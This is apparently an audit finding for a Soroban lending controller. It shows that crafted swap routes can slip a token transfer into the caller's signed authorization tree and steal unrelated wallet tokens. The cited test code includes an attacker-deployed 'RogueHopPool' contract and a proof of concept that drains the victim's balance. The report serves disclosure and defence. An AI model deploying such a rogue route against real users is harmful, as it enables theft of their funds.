### Title
Crafted swap route can steal unrelated wallet tokens via caller-signed authorization tree - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary
The controller accepts an opaque user-supplied `swap` payload in `swap_collateral`, `swap_debt`, and `repay_debt_with_collateral`, then invokes the configured router with that payload. Because route execution can place attacker-controlled pool code beneath the caller’s authorization, a crafted route can induce an additional `token.transfer(caller, attacker, amount)` that is recorded as a child authorization and succeeds if the victim signs the simulated authorization tree. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral` verifies only that `caller` owns or delegates the target account before passing the supplied `swap` bytes into `withdraw_and_swap_from_supply`. [4](#0-3)  `swap_tokens` snapshots input/output balances, authorizes one exact input transfer to the configured router, and calls `router.execute_strategy`, but it cannot constrain which contracts the opaque route subsequently invokes. [5](#0-4)  The protocol threat model explicitly notes that routes are not venue-allowlisted and that route-selected code can place a token transfer from the caller inside the caller’s signed authorization tree. [6](#0-5) 

The regression test demonstrates the mechanism with a route naming an attacker-controlled `RogueHopPool`; its `swap` method transfers the victim’s unrelated wallet token to the attacker. [7](#0-6)  Simulation records this malicious transfer as a child of the caller’s `swap_collateral` authorization, and enforcement accepts it when that poisoned tree is signed. [8](#0-7) [9](#0-8) 

### Impact Explanation
An attacker can steal arbitrary tokens held by the victim’s wallet, including assets completely unrelated to the lending market. [10](#0-9)  The proof drains Alice’s entire `77_770_000_000` wallet-token balance while still returning a valid swap output, so the controller’s positive-output and final-risk checks do not bound the theft. [11](#0-10) [12](#0-11) 

### Likelihood Explanation
Exploitation requires an unprivileged attacker to convince an account owner or active delegate to submit a crafted strategy route and sign the resulting authorization tree. [13](#0-12) [14](#0-13)  This matches the user-assisted nature of the referenced command-injection class: the malicious payload is embedded in an otherwise valid user action rather than requiring privileged access or a leaked key. [6](#0-5)  Clients that rely on simulation without decoding and rejecting unexpected child authorization entries are exposed. [15](#0-14) 

### Recommendation
Constrain strategy routes to explicitly approved venues and token contracts, or introduce a controller-visible route manifest that can be validated before router execution. [16](#0-15)  At minimum, route generation and signing interfaces should decode the full payload and reject any authorization tree containing child calls other than the expected input transfer. [15](#0-14) 

### Proof of Concept
The test constructs Alice with `10_000 USDC` supplied, a funded router, and a separate unlisted wallet token worth `77_770_000_000` units. [17](#0-16)  It then encodes a route whose `hop_pool` is a malicious contract configured to transfer that wallet token from Alice to the attacker. [18](#0-17)  Under `swap_collateral(caller=alice, account_id, current=USDC, amount=50_000_000_000, new=ETH, swap=route)`, simulation records the malicious `transfer(alice, attacker, WALLET_BALANCE)` as a child authorization. [19](#0-18) [8](#0-7)  Signing the poisoned tree causes the transfer to execute, leaving Alice with zero wallet tokens and the attacker with the full balance. [9](#0-8)

### Citations

**File:** interfaces/controller/src/lib.rs (L88-106)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    );

    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L74-84)
```rust
/// Returns the output balance increase; rejects zero or negative receipts.
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-22)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-107)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```
